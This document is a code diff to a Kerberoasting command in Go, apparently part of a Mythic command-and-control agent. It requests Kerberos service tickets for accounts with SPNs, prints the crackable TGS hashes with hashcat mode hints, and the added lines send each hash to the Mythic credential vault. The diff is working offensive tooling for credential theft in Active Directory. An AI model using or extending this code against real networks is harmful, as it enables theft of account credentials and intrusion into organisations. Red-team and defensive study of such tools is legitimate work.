@@ -137,6 +137,7 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 	sb.WriteString(strings.Repeat("-", 60) + "\n")
 
 	roasted := 0
+	var creds []structs.MythicCredential
 	for _, entry := range spns {
 		ticket, _, err := cl.GetServiceTicket(entry.SPN)
 		if err != nil {
@@ -153,15 +154,28 @@ func (c *KerberoastCommand) Execute(task structs.Task) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("\n[+] %s — %s (%s)\n", entry.Account, entry.SPN, etypeName))
 		sb.WriteString(hash + "\n")
 		roasted++
+
+		// Report TGS hash to Mythic credential vault
+		creds = append(creds, structs.MythicCredential{
+			CredentialType: "hash",
+			Realm:          args.Realm,
+			Account:        entry.Account,
+			Credential:     hash,
+			Comment:        fmt.Sprintf("kerberoast (%s) SPN: %s", etypeName, entry.SPN),
+		})
 	}
 
 	sb.WriteString(fmt.Sprintf("\n[*] %d/%d hashes extracted (hashcat -m 13100 for RC4, -m 19600 for AES128, -m 19700 for AES256)\n", roasted, len(spns)))
 
-	return structs.CommandResult{
+	result := structs.CommandResult{
 		Output:    sb.String(),
 		Status:    "success",
 		Completed: true,
 	}
+	if len(creds) > 0 {
+		result.Credentials = &creds
+	}
+	return result
 }
 
 type spnEntry struct {
